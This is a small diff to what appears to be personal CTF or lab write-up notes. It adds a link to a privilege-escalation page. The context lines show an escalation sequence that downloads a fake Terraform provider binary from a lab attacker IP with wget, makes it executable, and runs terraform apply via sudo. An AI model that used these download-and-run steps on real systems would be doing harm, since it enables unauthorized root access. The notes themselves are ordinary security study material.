@@ -110,6 +110,7 @@ wget http://10.10.14.141:8000/terraform-provider-examples
 chmod +x terraform-provider-examples
 sudo /usr/bin/terraform -chdir\=/opt/examples apply
 ```
+Look at [[Linux/Privilege Escalation|Privilege Escalation]] for more details
 
 ![[IMG-20250825192313844.png]]
 
